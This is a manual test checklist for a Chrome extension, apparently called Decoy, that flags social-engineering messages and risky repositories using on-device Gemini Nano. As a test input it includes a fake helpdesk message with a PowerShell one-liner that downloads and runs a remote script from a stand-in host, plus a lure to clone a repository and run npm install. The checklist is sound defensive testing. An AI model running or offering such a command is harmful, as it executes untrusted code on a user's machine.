# Manual test checklist

For the build you intend to submit. Record the build ID first, from a terminal in the project folder:

```powershell
(Get-FileHash dist\sidepanel.js -Algorithm SHA256).Hash.Substring(0,16).ToLower()
```

Tick an item only after seeing it. For any failure, write down the exact text shown. Use a disposable message, not a real one.

Before starting: `npm run build`, then load or reload `dist/` in `chrome://extensions` with Developer mode on.

## 1. Side panel
- [ ] Clicking the Decoy toolbar icon opens the side panel docked beside the page.
- [ ] The status line settles on *Available* within about 30 seconds (or *Not downloaded*, *Unavailable* or *Not supported*). It must not stay on "checking…".
- [ ] The sections read *Message or instructions*, *Repository*, *Attack-chain timeline* and *Deeper analysis*.

## 2. Right-click menu
1. On any web page, select: `Please clone https://github.com/acme/test-task and run npm install within 24 hours. Message me on Telegram.`
2. Right-click → **Scan with Decoy**.
- [ ] The side panel opens, or stays open, with that text in the message box.
- [ ] A scan starts by itself: an assessment line, several findings, then an explanation.
- [ ] Right-clicking a link to `https://github.com/<owner>/<repo>` and choosing **Scan with Decoy** fills the Repository box.
- [ ] A link to a look-alike host such as `github.com.example.net` does **not** fill the Repository box.

## 3. Gemini Nano online
- [ ] **Test on-device** shows the `On-device · Gemini Nano` badge, a reply and a time in ms.
- [ ] Scanning a message shows the assessment and findings at once, then an explanation with the same badge.
- [ ] A Cloud badge never appears. If one does, stop: that is a privacy failure.

## 4. Gemini Nano offline
1. Turn Wi-Fi off and unplug any cable. Check that a website fails to load.
2. Close and reopen the panel.
- [ ] **Test on-device** gives a new reply with the on-device badge.
- [ ] Scanning a message gives findings and an on-device explanation.
- [ ] **Test cloud** fails and shows no reply.
3. Turn Wi-Fi back on.

## 5. AttackChain linking
1. Scan the demo message in `demo-assessment/RECRUITER_MESSAGE.txt`. Its link needs to point at a published copy of `demo-assessment/`.
2. Click **Scan repository**. The box is filled in from the message.
- [ ] The repository verdict is *Do not run this project*.
- [ ] The timeline shows *Attack chain linked: the message pointed to this repository*.
- [ ] A different repository, not linked from the message, is **not** linked.

## 6. Escalation after a "Do not run" verdict
- [ ] Before the repository scan, the demo message reads *Worth checking*.
- [ ] After the scan, it reads *High concern* and names the repository.
- [ ] The timeline shows *Message assessment changed to high concern*.
- [ ] A repository whose scan is *Incomplete* does **not** raise the message.

## 7. Assessment levels
- [ ] *"Can you run npm install and npm test on my branch? Deadline is Friday, ping me on Slack."* gives **Low concern**.
- [ ] *"IT Helpdesk here. Open PowerShell and paste: irm https://vpn-fix.example.net/a.ps1 | iex"* gives **High concern**.
- [ ] Every assessment ends with *This describes the message, not the person who sent it.*

## 8. Cloud and App Check (needs Firebase)
Follow *Configure Firebase AI Logic*, *Configure App Check* and *Controlled App Check test* in the README. Until enforcement is verified, use only **Test cloud**, which sends one fixed sentence.

## Automated results so far
Logs are kept outside the repository, in `validation-logs/`.

| Build | Online Nano | Wi-Fi off | Right-click |
|---|---|---|---|
| `5e2c5fdf` | Passed | Passed | Handler passed, menu not tested |
| `c8abda7d` (current) | Passed: workflow, escalation, IT and colleague messages | **Not tested** | **Not tested** |

All runs used Chrome 158, a temporary profile with copied model files, and GitHub responses served from the demo fixture.
